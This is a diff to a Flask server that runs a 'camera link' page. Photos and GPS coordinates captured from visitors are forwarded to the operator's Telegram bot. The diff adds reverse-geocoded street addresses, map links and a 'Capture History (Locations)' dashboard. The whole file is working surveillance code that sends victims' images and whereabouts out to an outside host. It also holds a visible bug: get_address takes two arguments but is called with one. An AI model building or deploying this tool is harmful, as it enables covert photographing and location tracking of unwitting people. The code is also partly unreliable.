@@ -1,6 +1,6 @@
 from flask import Flask, request, send_file, jsonify, Response
 from werkzeug.middleware.proxy_fix import ProxyFix
-import os, base64, datetime, binascii, requests
+import os, base64, datetime, binascii, requests, json
 
 app = Flask(__name__)
 app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
@@ -8,22 +8,48 @@ app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
 TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
 ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin")
+LOG_FILE = "capture_log.json"
 
 def check_auth(auth):
     return auth and auth.username == "admin" and auth.password == ADMIN_PASSWORD
+
+def get_address(lat, lon):
+    if lat == "Location not supported" or "denied" in lat:
+        return "Unknown"
+    try:
+        # Extract raw numbers from string "lat, lon"
+        parts = lat.split(",")
+        if len(parts) == 2:
+            url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={parts[0].strip()}&lon={parts[1].strip()}"
+            headers = {'User-Agent': 'EducationalDemo/1.0'}
+            res = requests.get(url, headers=headers, timeout=5)
+            if res.status_code == 200:
+                data = res.json()
+                return data.get("display_name", "Unknown Address")
+    except Exception as e:
+        print("Geocode error:", e)
+    return "Unknown Address"
 
 @app.route("/")
 def index():
     return send_file("index.html")
 
-# --- NEW BEAUTIFUL DASHBOARD ---
 @app.route("/gallery")
 def gallery():
     auth = request.authorization
     if not check_auth(auth):
         return Response('Login required', 401, {'WWW-Authenticate': 'Basic realm="Admin"'})
     
-    # Create the link to open your Telegram chat directly
+    # Load logs
+    logs = []
+    if os.path.exists(LOG_FILE):
+        with open(LOG_FILE, "r") as f:
+            try:
+                logs = json.load(f)
+            except:
+                pass
+                
+    logs.reverse() # Show newest first
     tg_link = f"https://t.me/{TELEGRAM_CHAT_ID}" if TELEGRAM_CHAT_ID else "#"
     
     html = f"""
@@ -38,59 +64,44 @@ def gallery():
         .btn {{ background: var(--accent); color: #0f172a; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; text-decoration: none; font-size: 14px; transition: 0.2s; display: inline-block; }}
         .btn:hover {{ opacity: 0.8; }}
         .btn-tg {{ background: var(--tg); color: white; font-size: 16px; padding: 15px 30px; display: block; margin: 20px auto; text-align: center; max-width: 300px; border-radius: 50px; box-shadow: 0 4px 15px rgba(34, 158, 217, 0.4); }}
-        .btn-tg:hover {{ transform: scale(1.05); }}
         
-        .stats {{ display: flex; gap: 15px; margin-bottom: 20px; flex-wrap: wrap; }}
-        .stat-box {{ background: var(--card); padding: 20px; border-radius: 12px; flex: 1; min-width: 200px; border: 1px solid #334155; text-align: center; }}
-        .stat-box h3 {{ margin: 0 0 10px 0; font-size: 14px; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; }}
-        .stat-box p {{ margin: 0; font-size: 32px; font-weight: bold; color: var(--accent); }}
-        
-        .terminal {{ background: #000; border-radius: 8px; padding: 20px; font-family: monospace; color: #10b981; border: 1px solid #334155; margin-top: 20px; box-shadow: inset 0 0 10px rgba(0,0,0,0.5); }}
-        .terminal span {{ color: #64748b; }}
+        .list {{ display: flex; flex-direction: column; gap: 10px; }}
+        .log-item {{ background: var(--card); padding: 15px; border-radius: 8px; border-left: 4px solid var(--accent); display: flex; justify-content: space-between; align-items: center; }}
+        .log-item span {{ font-size: 14px; }}
+        .log-time {{ color: #94a3b8; font-size: 12px; }}
+        .log-loc {{ font-weight: bold; color: #10b981; }}
+        .no-data {{ text-align: center; padding: 40px; color: #64748b; }}
     </style>
-    <script>
-        function refreshPage() {{
-            window.location.reload();
-        }}
-    </script>
     </head><body>
     
     <div class="header">
         <h1>📷 Controller Command Center</h1>
         <div>
-            <button class="btn" onclick="refreshPage()">🔄 Sync Status</button>
-            <a href="/" class="btn" style="background:#334155; color:white;">Open Camera Link</a>
+            <a href="{tg_link}" target="_blank" class="btn btn-tg" style="margin:0; padding: 10px 20px; font-size: 14px;">✈️ Open Telegram</a>
+            <a href="/" class="btn" style="background:#334155; color:white;">Open Camera</a>
         </div>
     </div>
 
-    <div class="stats">
-        <div class="stat-box">
-            <h3>Server Status</h3>
-            <p style="color:#10b981">Online</p>
+    <h3 style="color:var(--accent)">Capture History (Locations)</h3>
+    <div class="list">
+    """
+    
+    if not logs:
+        html += "<div class='no-data'>No captures yet.</div>"
+        
+    for item in logs:
+        html += f"""
+        <div class="log-item">
+            <div>
+                <span class="log-time">{item.get('time', '')}</span><br>
+                <span class="log-loc">📍 {item.get('address', 'Unknown')}</span>
+            </div>
+            <a href="{item.get('map_link', '#')}" target="_blank" class="btn" style="padding: 5px 10px; font-size: 12px;">View on Map</a>
         </div>
-        <div class="stat-box">
-            <h3>Telegram Bot</h3>
-            <p style="color:{'#10b981' if TELEGRAM_TOKEN else '#ef4444'}">{'Connected' if TELEGRAM_TOKEN else 'Error'}</p>
-        </div>
-        <div class="stat-box">
-            <h3>Storage</h3>
-            <p style="color:#38bdf8">Cloud (Telegram)</p>
-        </div>
+        """
+        
+    html += """
     </div>
-
-    <a href="{tg_link}" target="_blank" class="btn btn-tg">
-        ✈️ Open Telegram to View Photos
-    </a>
-
-    <div class="terminal">
-        <span>[SYSTEM LOG]</span><br>
-        > Camera Link Active: <span>{request.host_url}</span><br>
-        > Telegram Integration: <span>Active</span><br>
-        > Waiting for new captures...<br>
-        > Photos are automatically forwarded to your Telegram bot.<br>
-        > Once sent, they are permanently saved in your Telegram chat.
-    </div>
-
     </body></html>
     """
     return html
@@ -99,19 +110,43 @@ def gallery():
 def shot():
     data = request.get_json(force=True)
     b64 = (data.get("img") or "").split(",", 1)[-1]
+    raw_loc = data.get("loc", "Unknown Location")
     
     if b64 and TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
         try:
+            # Convert GPS to Address for Telegram & Dashboard
+            address = get_address(raw_loc)
+            map_link = f"https://www.google.com/maps?q={raw_loc.replace(' ', '')}" if "," in raw_loc else "#"
+            
+            # Upload to Telegram
             img_data = base64.b64decode(b64)
             url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
             files = {'photo': ('image.jpg', img_data, 'image/jpeg')}
-            payload = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"📸 New capture: {datetime.datetime.utcnow():%Y-%m-%d %H:%M:%S}"}
             
-            response = requests.post(url, data=payload, files=files)
-            if response.status_code != 200:
-                print("Telegram Error:", response.text)
+            caption_text = f"📸 Capture: {datetime.datetime.now():%Y-%m-%d %H:%M:%S}\n📍 Location: {address}\n🗺️ Map: {map_link}"
+            payload = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption_text}
+            
+            requests.post(url, data=payload, files=files)
+
+            # Save to local log for the dashboard
+            log_entry = {
+                "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "address": address,
+                "map_link": map_link
+            }
+            
+            logs = []
+            if os.path.exists(LOG_FILE):
+                with open(LOG_FILE, "r") as f:
+                    try: logs = json.load(f)
+                    except: pass
+            logs.append(log_entry)
+            
+            with open(LOG_FILE, "w") as f:
+                json.dump(logs, f)
+                
         except Exception as e:
-            print("Error processing image:", e)
+            print("Error:", e)
             
     return "", 204
 
